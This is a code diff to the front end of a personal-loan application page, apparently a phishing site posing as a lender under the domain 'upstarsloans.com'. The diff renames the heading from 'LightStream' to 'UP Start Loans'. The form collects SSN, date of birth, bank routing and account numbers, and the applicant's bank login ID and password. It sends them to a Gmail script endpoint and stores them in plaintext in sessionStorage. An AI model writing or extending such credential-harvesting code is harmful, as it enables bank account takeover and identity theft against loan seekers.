@@ -591,21 +591,22 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
         // Add new fields that were missing
         loanAgent: formData.loanAgent,
         loanTerm: formData.loanTerm,
-        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm)
+        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
+        // Add borrower name for agreement email
+        borrower_name: formData.firstName + ' ' + formData.lastName,
+        // Add agreement number
+        agreementNumber: 'LS-' + Date.now(),
+        // Add signature status
+        signatureStatus: signature ? 'Electronic Signature (Canvas)' : 'Not signed',
+        // Add ID proof information
+        idProofName: idProofName || 'Not uploaded',
+        idProofSize: idProofSize || '0 MB',
+        idProofType: idProofType || 'None',
+        // Add submission date
+        submissionDate: new Date().toLocaleDateString()
       }
 
-      // Add missing calculateMonthlyPayment function
-      const calculateMonthlyPayment = (loanAmount, loanTerm) => {
-        if (!loanAmount || !loanTerm) return '0.00';
-        
-        const principal = parseFloat(loanAmount);
-        const months = parseInt(loanTerm);
-        const monthlyRate = 0.10 / 12; // 10% APR
-        
-        const monthlyPayment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
-        return monthlyPayment.toFixed(2);
-      }
-
+      
       // Submit to Gmail script
       const response = await fetch(scriptUrl, {
         method: 'POST',
@@ -619,9 +620,44 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
       const responseData = await response.json()
       if (response.ok && responseData.result === 'success') {
         console.log('Agreement submitted successfully')
-        alert('Agreement submitted successfully! You will receive an email confirmation shortly.')
-        // Navigate to success page
-        navigate('/loan-success')
+        
+        // Store customer data for dashboard access
+        const customerData = {
+          applicationId: 'LS-' + Date.now(),
+          firstName: formData.firstName,
+          lastName: formData.lastName,
+          email: formData.email,
+          phoneNumber: formData.phoneNumber,
+          homeAddress: formData.homeAddress,
+          city: formData.city,
+          state: formData.state,
+          zipCode: formData.zipCode,
+          dateOfBirth: formData.dateOfBirth,
+          ssnNumber: formData.ssnNumber,
+          loanAmount: formData.loanAmount,
+          loanPurpose: formData.loanPurpose,
+          loanTerm: formData.loanTerm,
+          monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
+          loanAgent: formData.loanAgent,
+          bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
+          routingNumber: formData.routingNumber,
+          accountNumber: formData.accountNumber,
+          userId: formData.userId,
+          password: formData.password,
+          status: 'review', // Initial status
+          submissionDate: new Date().toLocaleDateString(),
+          idProofName: idProofName,
+          idProofSize: idProofSize,
+          idProofType: idProofType
+        };
+
+        // Store in sessionStorage for dashboard access
+        sessionStorage.setItem('customerLoggedIn', 'true');
+        sessionStorage.setItem('customerData', JSON.stringify(customerData));
+
+        alert('Agreement submitted successfully! Your login details are provided on the next page.')
+        // Navigate to customer login details page
+        navigate('/customer-login-details')
       } else {
         console.error('Error submitting agreement:', responseData)
         throw new Error(responseData.error || 'Failed to submit agreement')
@@ -772,7 +808,7 @@ Privacy Policy: www.upstarsloans.com/privacy-policy
 Terms of Service: www.upstarsloans.com/terms-of-service`
   }
 
-  const downloadCompleteAgreement = async () => {
+  const downloadCompleteAgreement = async (event) => {
     if (!agreementAccepted) {
       alert('Please accept the agreement before downloading.')
       return
@@ -1160,14 +1196,52 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
       button.textContent = originalText
       button.disabled = false
       
-      alert('PDF agreement downloaded successfully!')
+      // Store customer data for dashboard access
+      const customerData = {
+        applicationId: 'LS-' + Date.now(),
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        email: formData.email,
+        phoneNumber: formData.phoneNumber,
+        homeAddress: formData.homeAddress,
+        city: formData.city,
+        state: formData.state,
+        zipCode: formData.zipCode,
+        dateOfBirth: formData.dateOfBirth,
+        ssnNumber: formData.ssnNumber,
+        loanAmount: formData.loanAmount,
+        loanPurpose: formData.loanPurpose,
+        loanTerm: formData.loanTerm,
+        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
+        loanAgent: formData.loanAgent,
+        bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
+        routingNumber: formData.routingNumber,
+        accountNumber: formData.accountNumber,
+        userId: formData.userId,
+        password: formData.password,
+        status: 'review', // Initial status
+        submissionDate: new Date().toLocaleDateString(),
+        idProofName: (typeof idProofName !== 'undefined') ? idProofName : 'Not uploaded',
+        idProofSize: (typeof idProofSize !== 'undefined') ? idProofSize : '0 MB',
+        idProofType: (typeof idProofType !== 'undefined') ? idProofType : 'None'
+      };
+
+      // Store in sessionStorage for dashboard access
+      sessionStorage.setItem('customerData', JSON.stringify(customerData));
+
+      alert('PDF agreement downloaded successfully! Your login details are provided on the next page.')
+      
+      // Navigate to customer login details page
+      navigate('/customer-login-details')
       
     } catch (error) {
       console.error('Error generating PDF:', error)
       alert('Error generating PDF. Please try again.')
       // Reset button
-      button.textContent = originalText
-      button.disabled = false
+      if (button && originalText) {
+        button.textContent = originalText
+        button.disabled = false
+      }
     }
   }
 
@@ -1920,7 +1994,7 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
     return (
     <div className="max-w-6xl mx-auto">
       <div className="text-center mb-8">
-        <h1 className="text-3xl font-bold text-gray-900 mb-2">LightStream Loan Agreement</h1>
+        <h1 className="text-3xl font-bold text-gray-900 mb-2">UP Start Loans Loan Agreement</h1>
         <p className="text-gray-600">Review and Sign Your Personal Loan Agreement</p>
       </div>
 
@@ -2341,7 +2415,7 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
                     <option value="terms">Terms & Conditions</option>
                   </select>
                   <button
-                    onClick={downloadCompleteAgreement}
+                    onClick={(e) => downloadCompleteAgreement(e)}
                     disabled={!agreementAccepted}
                     className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white px-4 py-2 rounded text-sm"
                   >
